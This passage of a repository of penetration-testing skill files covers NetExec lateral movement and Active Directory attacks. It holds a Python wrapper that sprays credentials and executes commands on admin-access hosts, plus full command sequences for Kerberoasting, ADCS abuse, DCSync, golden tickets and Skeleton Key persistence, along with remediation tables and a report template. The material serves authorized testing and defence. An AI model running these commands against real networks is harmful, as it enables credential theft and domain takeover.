ls ~/.nxc/workspaces/         # SQLite result store
nxc smb <t> ... --log out.log # tee output to file
```

## External References

- NetExec Wiki: https://www.netexec.wiki/
- SMB protocol docs: https://www.netexec.wiki/smb-protocol/authentication
- Module list: https://www.netexec.wiki/

===== END FILE =====


===== FILE: skills/moving-laterally-with-netexec/references/standards.md =====
# Standards and References — Moving Laterally with NetExec

## MITRE ATT&CK References

| Technique ID | Name | Tactic | Rationale |
|-------------|------|--------|-----------|
| T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement | NetExec authenticates to `ADMIN$`/`C$` and runs code on remote hosts |
| T1110.003 | Brute Force: Password Spraying | Credential Access | `--continue-on-success` sprays one password across many accounts |
| T1003.002 | OS Credential Dumping: Security Account Manager | Credential Access | `--sam` extracts local account hashes |
| T1003.004 | OS Credential Dumping: LSA Secrets | Credential Access | `--lsa` extracts LSA secrets and cached domain creds |
| T1003.006 | OS Credential Dumping: DCSync | Credential Access | `--ntds` replicates the domain database via DRSUAPI |
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | Credential Access | `ldap --kerberoasting` requests crackable service tickets |
| T1087.002 | Account Discovery: Domain Account | Discovery | `--users` / `--rid-brute` enumerate domain accounts |
| T1135 | Network Share Discovery | Discovery | `--shares` enumerates accessible SMB shares |

## NIST Cybersecurity Framework 2.0

| ID | Name | Rationale |
|----|------|-----------|
| DE.CM-01 | Networks and network services are monitored to find potentially adverse events | NetExec activity (mass auth, exec, dumping) is the adverse behavior defenders must detect; this skill informs detection coverage |

## Official Resources

- NetExec GitHub: https://github.com/Pennyw0rth/NetExec
- NetExec Wiki: https://www.netexec.wiki/
- Selecting a protocol: https://www.netexec.wiki/getting-started/selecting-and-using-a-protocol
- Impacket: https://github.com/fortra/impacket
- MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/

## Key Research

- Black Hills InfoSec: Getting Started with NetExec
- StationX: NetExec Cheat Sheet (2026 Guide)
- Vaadata: NetExec, the Tool for Auditing an Internal Network

===== END FILE =====


===== FILE: skills/moving-laterally-with-netexec/scripts/agent.py =====
#!/usr/bin/env python3
# For authorized penetration testing and educational environments only.
# Usage against targets without prior mutual written consent is illegal.
# It is the end user's responsibility to obey all applicable laws.
"""NetExec lateral-movement helper.

Wraps the `nxc` CLI to validate credentials across a host range, identify
admin (Pwn3d!) access, enumerate shares, and optionally run a command.
Parses NetExec stdout to produce a structured JSON report.
"""

import argparse
import json
import re
import shutil
import subprocess
import sys
from datetime import datetime, timezone

# NetExec marks admin code-exec hosts with (Pwn3d!) and successes with [+]
PWNED_RE = re.compile(r"^(?P<proto>\w+)\s+(?P<ip>[\d.]+)\s+\d+\s+(?P<host>\S+)\s+"
                      r"\[\+\]\s+(?P<cred>\S+)(?P<pwned>\s+\(Pwn3d!\))?", re.M)


def ensure_nxc():
    """Verify the nxc binary is on PATH."""
    if shutil.which("nxc") is None:
        sys.exit("[!] nxc not found. Install: pipx install "
                 "git+https://github.com/Pennyw0rth/NetExec")


def run_nxc(args_list, timeout=600):
    """Run an nxc command and return combined stdout/stderr text."""
    cmd = ["nxc"] + args_list
    print(f"[*] {' '.join(cmd)}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return proc.stdout + proc.stderr
    except subprocess.TimeoutExpired:
        return "[!] nxc timed out"
    except FileNotFoundError:
        sys.exit("[!] nxc not found on PATH")


def parse_results(output):
    """Extract successful auths and admin (Pwn3d!) hosts from nxc output."""
    successes, pwned = [], []
    for m in PWNED_RE.finditer(output):
        rec = {"protocol": m.group("proto"), "ip": m.group("ip"),
               "host": m.group("host"), "cred": m.group("cred"),
               "admin": bool(m.group("pwned"))}
        successes.append(rec)
        if rec["admin"]:
            pwned.append(rec)
    return successes, pwned


def build_auth(args):
    """Build the auth portion of an nxc command."""
    auth = ["-u", args.user]
    if args.hash:
        auth += ["-H", args.hash]
    elif args.password:
        auth += ["-p", args.password]
    if args.domain:
        auth += ["-d", args.domain]
    if args.local_auth:
        auth += ["--local-auth"]
    return auth


def main():
    p = argparse.ArgumentParser(description="NetExec lateral-movement helper")
    p.add_argument("target", help="Target IP, CIDR, or hosts file")
    p.add_argument("-u", "--user", required=True, help="Username or users file")
    p.add_argument("-p", "--password", help="Password or passwords file")
    p.add_argument("-H", "--hash", help="NT hash or LM:NT for pass-the-hash")
    p.add_argument("-d", "--domain", help="AD domain")
    p.add_argument("--protocol", default="smb",
                   choices=["smb", "winrm", "ldap", "mssql", "ssh", "wmi", "rdp"])
    p.add_argument("--local-auth", action="store_true", help="Use local SAM auth")
    p.add_argument("--shares", action="store_true", help="Enumerate shares on hits")
    p.add_argument("--spray", action="store_true",
                   help="Add --continue-on-success for password spraying")
    p.add_argument("--exec", dest="exec_cmd", help="Command to run on Pwn3d! hosts")
    p.add_argument("--exec-method", choices=["smbexec", "wmiexec", "atexec", "mmcexec"])
    p.add_argument("--output", help="Write JSON report to file")
    args = p.parse_args()

    if not args.password and not args.hash:
        p.error("provide -p/--password or -H/--hash")

    ensure_nxc()
    report = {"generated": datetime.now(timezone.utc).isoformat(),
              "target": args.target, "protocol": args.protocol}

    # 1. Validate credentials
    cmd = [args.protocol, args.target] + build_auth(args)
    if args.spray:
        cmd.append("--continue-on-success")
    output = run_nxc(cmd)
    successes, pwned = parse_results(output)
    report["successful_auths"] = successes
    report["admin_hosts"] = pwned
    print(f"[+] {len(successes)} successful auth(s), {len(pwned)} with admin access")

    # 2. Optional share enumeration
    if args.shares and successes:
        sh = run_nxc([args.protocol, args.target] + build_auth(args) + ["--shares"])
        report["shares_raw"] = sh.strip().splitlines()[-50:]

    # 3. Optional command execution on admin hosts
    if args.exec_cmd and pwned:
        report["exec_results"] = {}
        for host in pwned:
            ex = [args.protocol, host["ip"]] + build_auth(args) + ["-x", args.exec_cmd]
            if args.exec_method:
                ex += ["--exec-method", args.exec_method]
            report["exec_results"][host["ip"]] = run_nxc(ex).strip().splitlines()[-20:]

    if args.output:
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
        print(f"[+] Report written to {args.output}")
    else:
        print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-active-directory-penetration-test/SKILL.md =====
---
name: performing-active-directory-penetration-test
description: Conduct a focused Active Directory penetration test using BloodHound,
  Impacket, Certipy, Rubeus, and NetExec to enumerate domain objects, discover attack
  paths, exploit Kerberos weaknesses, escalate privileges via ADCS/DCSync, and demonstrate
  domain compromise. Use when running an authorized AD pentest from a standard domain
  user foothold toward Domain Admin or Enterprise Admin.
domain: cybersecurity
subdomain: penetration-testing
tags:
- active-directory
- BloodHound
- Kerberoasting
- Impacket
- DCSync
- ADCS
- domain-compromise
- privilege-escalation
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1068
---

# Performing Active Directory Penetration Test

## Overview

Active Directory (AD) penetration testing targets the central identity and access management system used by over 95% of Fortune 500 companies. The test identifies misconfigurations, weak credentials, dangerous delegation settings, vulnerable certificate templates, and attack paths that enable an attacker to escalate from a standard domain user to Domain Admin or Enterprise Admin.


## When to Use

- When conducting security assessments that involve performing active directory penetration test
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Standard domain user credentials (minimum starting point)
- Network access to domain controllers (LDAP/389, Kerberos/88, SMB/445, DNS/53)
- Tools: BloodHound, Impacket, Certipy, Rubeus, NetExec, Mimikatz
- Kali Linux or Windows attack machine with domain access

## Phase 1 — AD Enumeration

### Domain Information Gathering

```bash
# Basic domain enumeration
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local --groups
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local --users

# LDAP enumeration — domain controllers
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "OU=Domain Controllers,DC=corp,DC=local" "(objectClass=computer)" dNSHostName

# Enumerate trust relationships
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --trusts

# Enumerate domain password policy
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --pass-pol

# Enumerate Group Policy Objects
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords

# Find computers with unconstrained delegation
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  dNSHostName

# Find users with constrained delegation
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(&(objectCategory=user)(msds-allowedtodelegateto=*))" \
  sAMAccountName msds-allowedtodelegateto

# Enumerate LAPS
netexec ldap 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local -M laps
```

### BloodHound Attack Path Analysis

```bash
# Collect all BloodHound data
bloodhound-python -u 'testuser' -p 'Password123' -d corp.local \
  -ns 10.0.0.5 -c all --zip

# Alternative: SharpHound from Windows
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Start BloodHound
sudo neo4j start
bloodhound --no-sandbox

# Key Cypher queries in BloodHound:
# - Shortest path to Domain Admin
# - Find Kerberoastable users
# - Find AS-REP Roastable users
# - Find users with DCSync rights
# - Find shortest path from owned principals
# - Find computers where Domain Users are local admin
```

### Service Account Discovery

```bash
# Find service accounts with SPNs (Kerberoastable)
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5

# Find accounts without Kerberos pre-authentication
impacket-GetNPUsers 'corp.local/' -usersfile domain_users.txt \
  -dc-ip 10.0.0.5 -format hashcat

# Find managed service accounts
ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(objectClass=msDS-GroupManagedServiceAccount)" \
  sAMAccountName msDS-GroupMSAMembership
```

## Phase 2 — Kerberos Attacks

### Kerberoasting

```bash
# Extract TGS tickets for service accounts
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
  -outputfile kerberoast.txt -request

# Crack with Hashcat (mode 13100 for Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

# Targeted Kerberoasting with Rubeus (Windows)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt
```

### AS-REP Roasting

```bash
# Target accounts without pre-authentication
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
  -outputfile asrep.txt -format hashcat

# Crack AS-REP hashes (mode 18200)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberos Delegation Attacks

```bash
# Unconstrained delegation — extract TGTs from memory
# If you compromise a host with unconstrained delegation:
.\Rubeus.exe monitor /interval:5 /nowrap
# Force authentication from DC using PrinterBug/SpoolSample
.\SpoolSample.exe DC01.corp.local YOURHOST.corp.local
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Constrained delegation — S4U abuse
impacket-getST 'corp.local/svc_web:WebPass123' -spn 'CIFS/fileserver.corp.local' \
  -dc-ip 10.0.0.5 -impersonate administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec 'corp.local/administrator@fileserver.corp.local' -k -no-pass

# Resource-Based Constrained Delegation (RBCD)
impacket-addcomputer 'corp.local/testuser:Password123' -computer-name 'EVIL$' \
  -computer-pass 'EvilPass123' -dc-ip 10.0.0.5
python3 rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' \
  -dc-ip 10.0.0.5 'corp.local/testuser:Password123'
impacket-getST 'corp.local/EVIL$:EvilPass123' -spn 'CIFS/target.corp.local' \
  -impersonate administrator -dc-ip 10.0.0.5
```

## Phase 3 — ADCS (Active Directory Certificate Services) Attacks

```bash
# Enumerate ADCS with Certipy
certipy find -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5 \
  -vulnerable -stdout

# ESC1 — Vulnerable certificate template (enrollee can specify SAN)
certipy req -u 'testuser@corp.local' -p 'Password123' \
  -target ca.corp.local -ca CORP-CA \
  -template VulnerableWebServer -upn administrator@corp.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.5

# ESC4 — Template ACL misconfiguration
# Modify template to enable ESC1 conditions, then exploit as above

# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
certipy req -u 'testuser@corp.local' -p 'Password123' \
  -target ca.corp.local -ca CORP-CA \
  -template User -upn administrator@corp.local

# ESC8 — NTLM relay to HTTP enrollment endpoint
certipy relay -target 'http://ca.corp.local/certsrv/certfnsh.asp' \
  -template DomainController
```

## Phase 4 — Domain Privilege Escalation

### DCSync Attack

```bash
# DCSync — extract all domain hashes (requires replication rights)
impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' -just-dc

# DCSync specific user
impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' \
  -just-dc-user krbtgt

# With Mimikatz (Windows)
mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Golden Ticket

```bash
# Create Golden Ticket (requires krbtgt hash and domain SID)
impacket-ticketer -nthash <krbtgt_nthash> -domain-sid S-1-5-21-... \
  -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec 'corp.local/administrator@dc01.corp.local' -k -no-pass

# With Mimikatz
mimikatz# kerberos::golden /user:administrator /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

### Silver Ticket

```bash
# Create Silver Ticket for specific service
impacket-ticketer -nthash <service_nthash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn MSSQL/sqlserver.corp.local administrator

export KRB5CCNAME=administrator.ccache
impacket-mssqlclient 'corp.local/administrator@sqlserver.corp.local' -k -no-pass
```

## Phase 5 — Persistence Demonstration

```bash
# Skeleton Key (inject into LSASS — authorized testing only)
mimikatz# privilege::debug
mimikatz# misc::skeleton
# Now any user can authenticate with "mimikatz" as password

# AdminSDHolder persistence
# Add controlled user to AdminSDHolder ACL
# SDProp process propagates ACL to all protected groups every 60 minutes

# SID History injection
# Inject Domain Admin SID into low-privilege user's SID history

# Document all persistence mechanisms and clean up after testing
```

## Findings and Remediation

| Finding | CVSS | Remediation |
|---------|------|-------------|
| Kerberoastable accounts with weak passwords | 7.5 | Use gMSA, enforce 25+ char passwords for service accounts |
| Unconstrained delegation on servers | 8.1 | Remove unconstrained delegation, use constrained or RBCD |
| Vulnerable ADCS templates (ESC1-ESC8) | 9.8 | Audit templates, remove dangerous permissions, require approval |
| DCSync permissions on non-DA accounts | 9.8 | Audit replication rights, implement tiered admin model |
| LLMNR/NBT-NS enabled | 8.1 | Disable via GPO |
| No LAPS deployed | 7.2 | Deploy Windows LAPS for local admin management |
| Weak domain password policy | 6.5 | Enforce 14+ chars, implement fine-grained password policies |

## References

- BloodHound: https://github.com/BloodHoundAD/BloodHound
- Impacket: https://github.com/fortra/impacket
- Certipy: https://github.com/ly4k/Certipy
- HackTricks AD: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
- SpecterOps AD Security: https://specterops.io/blog/
- MITRE ATT&CK: https://attack.mitre.org/

===== END FILE =====


===== FILE: skills/performing-active-directory-penetration-test/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-active-directory-penetration-test/assets/template.md =====
# Active Directory Penetration Test — Report Template

## Document Control
| Field | Value |
|-------|-------|
| Domain | [corp.local] |
| Test Type | Active Directory Security Assessment |
| Starting Access | Standard Domain User |
| Period | [Start] — [End] |

## Executive Summary
[Summary of AD security posture, key attack paths discovered, and domain compromise status]

## Attack Path Diagram
```
testuser (Domain User)
  → Kerberoasting svc_sql (T1558.003)
    → Cracked password: "SqlServer2024!"
      → Local admin on SQL01 (T1078)
        → Mimikatz LSASS dump (T1003.001)
          → DA credentials: da_admin
            → DCSync all hashes (T1003.006)
              → FULL DOMAIN COMPROMISE
```

## Findings

### Finding [N]: [Title]
| Attribute | Detail |
|-----------|--------|
| Severity | [Critical/High/Medium/Low] |
| MITRE ATT&CK | [Technique] |
| Affected | [Accounts/Systems] |
| Remediation | [Fix] |

## Remediation Priority
| # | Action | Timeline |
|---|--------|----------|
| 1 | Deploy gMSA for service accounts | 2 weeks |
| 2 | Fix ADCS vulnerable templates | 1 week |
| 3 | Implement tiered admin model | 30 days |
| 4 | Enable LAPS | 30 days |

===== END FILE =====


===== FILE: skills/performing-active-directory-penetration-test/references/api-reference.md =====
# Active Directory Penetration Test - API Reference

## ldap3 Library

### Connection
```python
from ldap3 import Server, Connection, ALL, SUBTREE
server = Server("ldaps://dc.example.com", get_info=ALL, use_ssl=True)
conn = Connection(server, user="DOMAIN\\user", password="pass", auto_bind=True)
```

### Key LDAP Queries

| Purpose | Filter |
|---------|--------|
| All users | `(&(objectClass=user)(objectCategory=person))` |
| Users with SPNs | `(&(objectClass=user)(servicePrincipalName=*))` |
| AS-REP Roastable | `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))` |
| Domain admins | `(&(objectClass=group)(cn=Domain Admins))` |
| Password policy | `(objectClass=domain)` |

### UserAccountControl Flags

| Flag | Hex | Test |
|------|-----|------|
| ACCOUNTDISABLE | 0x0002 | Account disabled |
| PASSWD_NOTREQD | 0x0020 | No password required |
| DONT_EXPIRE_PASSWORD | 0x10000 | Password never expires |
| DONT_REQ_PREAUTH | 0x400000 | No Kerberos pre-auth |

## Impacket Tools

### GetUserSPNs (Kerberoasting)
```bash
python3 -m impacket.examples.GetUserSPNs DOMAIN/user:pass -dc-ip 10.0.0.1 -request
```

### GetNPUsers (AS-REP Roasting)
```bash
python3 -m impacket.examples.GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip 10.0.0.1
```

### secretsdump (Credential Extraction)
```bash
python3 -m impacket.examples.secretsdump DOMAIN/admin:pass@10.0.0.1
```

## Attack Techniques

### Kerberoasting
1. Enumerate users with SPNs via LDAP
2. Request TGS tickets for those SPNs
3. Extract ticket hashes
4. Crack offline with hashcat (mode 13100)

### AS-REP Roasting
1. Find accounts with pre-auth disabled
2. Request AS-REP without authentication
3. Extract encrypted part of AS-REP
4. Crack offline with hashcat (mode 18200)

### Password Policy Weaknesses
- Min length < 12 characters
- No account lockout threshold
- No password history enforcement
- Password never expires on service accounts

## Output Schema

```json
{
  "report": "ad_penetration_test",
  "domain_info": {"default_naming_context": "DC=example,DC=com"},
  "total_users": 500,
  "total_findings": 12,
  "severity_summary": {"critical": 1, "high": 8, "medium": 3}
}
```

## CLI Usage

```bash
python agent.py --server ldaps://dc.example.com --username "DOMAIN\\user" --password "pass" --output report.json
```

===== END FILE =====


===== FILE: skills/performing-active-directory-penetration-test/references/standards.md =====
# Standards — Active Directory Penetration Testing

## Key Frameworks
- MITRE ATT&CK for Enterprise: https://attack.mitre.org/matrices/enterprise/
- ANSSI AD Security Guide: https://www.cert.ssi.gouv.fr/uploads/guide-ad.html
- Microsoft Tiered Administration Model: https://learn.microsoft.com/en-us/security/privileged-access-workstations/privileged-access-access-model

## MITRE ATT&CK Techniques for AD Testing

| Technique | ID | Description |
|-----------|----|-------------|
| Kerberoasting | T1558.003 | Steal Kerberos TGS tickets for offline cracking |
| AS-REP Roasting | T1558.004 | Target accounts without pre-auth |
| DCSync | T1003.006 | Replicate domain credentials via DRSUAPI |
| Golden Ticket | T1558.001 | Forge TGT using krbtgt hash |
| Pass-the-Hash | T1550.002 | Authenticate using NTLM hash |
| Unconstrained Delegation | T1558 | Abuse delegation to steal TGTs |
| ADCS Abuse | T1649 | Exploit misconfigured certificate templates |

## AD Security Benchmarks
- CIS Microsoft Windows Server Benchmark
- STIG (Security Technical Implementation Guide) for Windows
- Microsoft Security Compliance Toolkit

===== END FILE =====


===== FILE: skills/performing-active-directory-penetration-test/references/workflows.md =====
# Workflows — Active Directory Penetration Testing

## AD Attack Flow

```
Domain User Credentials
    │
    ├── Enumeration
    │   ├── BloodHound (attack paths)
    │   ├── LDAP queries (users, groups, GPOs)
    │   └── Service account discovery (SPNs)
    │
    ├── Kerberos Attacks
    │   ├── Kerberoasting → Hash cracking
    │   ├── AS-REP Roasting → Hash cracking
    │   └── Delegation abuse (unconstrained/constrained/RBCD)
    │
    ├── ADCS Attacks
    │   ├── ESC1-ESC8 template exploitation
    │   └── Certificate-based auth to DA
    │
    ├── Credential Harvesting
    │   ├── LSASS dump (Mimikatz)
    │   ├── SAM/SYSTEM extraction
    │   └── DPAPI credential decryption
    │
    ├── Domain Escalation
    │   ├── DCSync (krbtgt + all hashes)
    │   ├── Golden Ticket
    │   └── AdminSDHolder persistence
    │
    └── Impact Demonstration
        ├── Full domain hash extraction
        ├── Access to sensitive resources
        └── Cross-forest trust abuse
```

===== END FILE =====


===== FILE: skills/performing-active-directory-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
"""Active Directory Penetration Test agent - automates AD enumeration using
ldap3 for LDAP queries, subprocess for impacket tools, and generates a
structured pentest findings report."""

import argparse
import json
import subprocess
import sys
from datetime import datetime
from pathlib import Path

try:
    from ldap3 import Server, Connection, ALL, SUBTREE
except ImportError:
    print("Install ldap3: pip install ldap3", file=sys.stderr)
    sys.exit(1)


def connect_ldap(server_url: str, username: str, password: str, use_ssl: bool = True) -> Connection:
    """Establish authenticated LDAP connection."""
    srv = Server(server_url, get_info=ALL, use_ssl=use_ssl)
    conn = Connection(srv, user=username, password=password, auto_bind=True)
    return conn


def get_domain_info(conn: Connection) -> dict:
    """Extract domain functional level and naming context."""
    info = conn.server.info
    return {
        "default_naming_context": info.other.get("defaultNamingContext", [""])[0],
        "forest_functionality": info.other.get("forestFunctionality", [""])[0],
        "domain_functionality": info.other.get("domainFunctionality", [""])[0],
    }


def enumerate_users(conn: Connection, base_dn: str) -> list[dict]:
    """Enumerate all domain users with security-relevant attributes."""
    conn.search(base_dn, "(&(objectClass=user)(objectCategory=person))",
                search_scope=SUBTREE,
                attributes=["sAMAccountName", "userAccountControl", "adminCount",
                             "pwdLastSet", "lastLogon", "servicePrincipalName",
                             "memberOf", "description"])
    users = []
    for entry in conn.entries:
        uac = int(str(entry.userAccountControl)) if hasattr(entry, "userAccountControl") else 0
        users.append({
            "username": str(entry.sAMAccountName),
            "admin_count": str(entry.adminCount) if hasattr(entry, "adminCount") else "0",
            "password_not_required": bool(uac & 0x0020),
            "password_never_expires": bool(uac & 0x10000),
            "account_disabled": bool(uac & 0x0002),
            "kerberos_preauth_not_required": bool(uac & 0x400000),
            "has_spn": bool(entry.servicePrincipalName),
            "description": str(entry.description) if hasattr(entry, "description") else "",
        })
    return users


